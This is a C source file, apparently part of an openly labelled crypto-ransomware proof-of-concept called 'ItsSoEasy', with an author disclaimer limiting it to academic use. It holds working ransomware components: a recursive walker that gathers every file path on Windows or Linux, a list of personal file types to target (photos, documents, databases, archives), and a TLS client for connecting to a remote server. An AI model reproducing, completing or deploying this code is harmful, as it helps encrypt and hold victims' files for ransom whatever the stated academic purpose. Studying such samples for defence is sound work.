/*
ItsSoEasy -- Crypto-Ransomware Proof-of-Concept

''' ransomware version (C99) '''

What?
This is a Ransomware Concept written in C. Yes it is malicious. Yes, if you do that on VMs it is okay. Yes,
if you misconfigured the architecture or network and encrypt your own files they are gone forever.

Copyright (c) 2021/2022 Bastian Buck
Contact: https://github.com/bstnbuck

Attention! Use of the code samples and proof-of-concepts shown here is permitted solely at your own risk for academic
        and non-malicious purposes. It is the end user's responsibility to comply with all applicable local, state,
and federal laws. The developer assumes no liability and is not responsible for any misuse or damage caused by this
        tool and the software in general.
*/

#include <stdio.h>
#include "helper.h"
#include <string.h>

#ifdef _WIN32

#elif __linux__
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <unistd.h>
    #include <sys/types.h>
    #include <dirent.h>
    // define bool variables to get one value for both OSes
    #define FALSE false
    #define TRUE true
#endif

// max path length on windows
#define MAX_PATH 260

// for better readable code
void println(const char *str){
    printf("%s\n", str);
}


// counter to count files
static int fileCounter = 0;
// https://stackoverflow.com/questions/2314542/listing-directory-contents-using-c-and-windows
// https://stackoverflow.com/questions/26357792/return-a-list-of-files-in-a-folder-in-c
// https://stackoverflow.com/questions/8436841/how-to-recursively-list-directories-in-c-on-linux/29402705
int walk(const char *path, char *buf[]){
#ifdef _WIN32
    WIN32_FIND_DATA fdFile;
    HANDLE hFind = NULL;

    char sPath[2048];

    //Specify a file mask. *.* = We want everything!
    sprintf(sPath, "%s\\*.*", path);

    if((hFind = FindFirstFile(sPath, &fdFile)) == INVALID_HANDLE_VALUE){
        printf("Path not found: [%s]\n", path);
        return fileCounter;
    }
    do{
        //i++;
        //Find first file will always return "."
        //    and ".." as the first two directories.
        if(strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0){
            //Build up our file path using the passed in
            //  [sDir] and the file/foldername we just found:
            sprintf(sPath, "%s\\%s", path, fdFile.cFileName);

            //Is the entity a File or Folder?
            if(fdFile.dwFileAttributes &FILE_ATTRIBUTE_DIRECTORY){
                //printf("Directory: %s\n", sPath);
                walk(sPath, buf); //Recursion, I love it!
            }else{
                buf[fileCounter] = strdup(sPath);
                fileCounter++;
                //printf("File: %s\n", sPath);
            }
        }
    }while(FindNextFile(hFind, &fdFile)); //Find the next file.

    FindClose(hFind); //Always, Always, clean things up!

#elif __linux__
    // https://stackoverflow.com/questions/8436841/how-to-recursively-list-directories-in-c-on-linux/29402705
    DIR *dir;
    struct dirent *entry;
    char sPath[4096];

    if (!(dir = opendir(path)))
        return fileCounter;

    while ((entry = readdir(dir)) != NULL) {
        // https://stackoverflow.com/questions/9241538/dt-dir-undefined
        // compile it with "-D_BSD_SOURCE"
        if (entry->d_type == DT_DIR) {
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;
            sprintf(sPath, "%s/%s", path, entry->d_name);
            walk(sPath, buf);
        } else {
            sprintf(sPath, "%s/%s", path, entry->d_name);
            buf[fileCounter] = strdup(sPath);
            fileCounter++;
            //printf("%*s- %s\n", indent, "", entry->d_name);
        }
    }
    closedir(dir);
#endif
    return fileCounter;
}

// https://stackoverflow.com/questions/5309471/getting-file-extension-in-c
bool hasExt(const char *file){
    if (file == NULL)
        return FALSE;
    // https://github.com/deadPix3l/CryptSky/blob/master/discover.py
    // dynamic char array of variable chars a.k.a. string array :)
    char *extensions[] = {
            // 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  // SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
            "JPG", "jpeg", "bmp", "gif", "png", "svg", "psd", "raw",  // images
            "mp3", "mp4", "m4a", "aac", "ogg", "flac", "wav", "wma", "aiff", "ape",  // music and sound
            "avi", "flv", "m4v", "mkv", "mov", "mpg", "mpeg", "wmv", "swf", "3gp",  // Video and movies

            "doc", "docx", "xls", "xlsx", "ppt", "pptx",  // Microsoft office
            "odt", "odp", "ods", "txt", "rtf", "tex", "pdf", "epub", "md",  // OpenOffice, Adobe, Latex, Markdown, etc
            "yml", "yaml", "json", "xml", "csv",  // structured data
            "db", "sql", "dbf", "mdb", "iso",  // databases and disc images

            "html", "htm", "xhtml", "php", "asp", "aspx", "js", "jsp", "css",  // web technologies

            "zip", "tar", "tgz", "bz2", "7z", "rar", "bak"  // compressed formats
    };
    for (int i = 0; i< sizeof(extensions) / sizeof(extensions[0]); i++){
        const char *dot = strrchr(file, '.');
        if (!dot || dot == file){
            return FALSE;
        }else{
            if (strncmp(dot+1, extensions[i], strlen(extensions[i])) == 0 && strlen(extensions[i] )== strlen(dot + 1))
                return TRUE;
            else
                continue;
        }
    }
    return FALSE;
}

SSL* getTlsSocket(const char *hostname, int port){
#ifdef _WIN32

    SOCKET sd;
    SOCKADDR_IN addr;
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,0),&wsa);

    sd = socket(AF_INET, SOCK_STREAM, 0);
    if (sd == INVALID_SOCKET) {
        printf("Invalid Socket! %d\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(hostname);
    if ( connect(sd, (SOCKADDR *)&addr, sizeof(SOCKADDR)) == SOCKET_ERROR ){
        printf("Cannot connect %d\n", WSAGetLastError());
        WSACleanup();
        exit(1);
    }

    // https://stackoverflow.com/questions/7698488/turn-a-simple-socket-into-an-ssl-socket
    SSL_CTX *ctx;
    SSL_load_error_strings();
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    ctx = SSL_CTX_new(TLSv1_2_client_method());   /* Create new context */
    if ( ctx == NULL ){
        println("Error in creating TLS context");
        WSACleanup();
        exit(1);
    }

    /////
    SSL *ssl;

    ssl = SSL_new(ctx);      /* create new SSL connection state */
    SSL_set_fd(ssl, (int) sd);    /* attach the socket descriptor */
    if ( SSL_connect(ssl) == -1 ) {   /* perform the connection */
        println((const char *) stderr);
        WSACleanup();
        return NULL;
    }else{
        return ssl;
    }
#elif __linux__ // https://aticleworld.com/ssl-server-client-using-openssl-in-c/
    int sd;
    struct sockaddr_in servaddr;

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(port);

    if ( (servaddr.sin_addr.s_addr = inet_addr(hostname)) == NULL ){
        perror(hostname);
        println("Error while creating socket!");
        exit(1);
    }

    if ((sd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
        println("Error creating socket!");
        exit(1);
    }

    if ( connect(sd, (struct sockaddr*)&servaddr, sizeof(servaddr)) != 0 ){
        close(sd);
        perror(hostname);
        println("Error while connecting!");
        exit(1);
    }

    SSL_CTX *ctx;
    SSL_load_error_strings();
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    ctx = SSL_CTX_new(TLSv1_2_client_method());   /* Create new context */
    if ( ctx == NULL ){
        println("Error in creating TLS context");
        close(sd);
        exit(1);
    }

    /////
    SSL *ssl;

    ssl = SSL_new(ctx);      /* create new SSL connection state */
    SSL_set_fd(ssl, (int) sd);    /* attach the socket descriptor */
    if ( SSL_connect(ssl) == -1 ) {   /* perform the connection */
        println((const char *) stderr);
        close(sd);
        return NULL;
    }else{
        return ssl;
    }
#endif
}
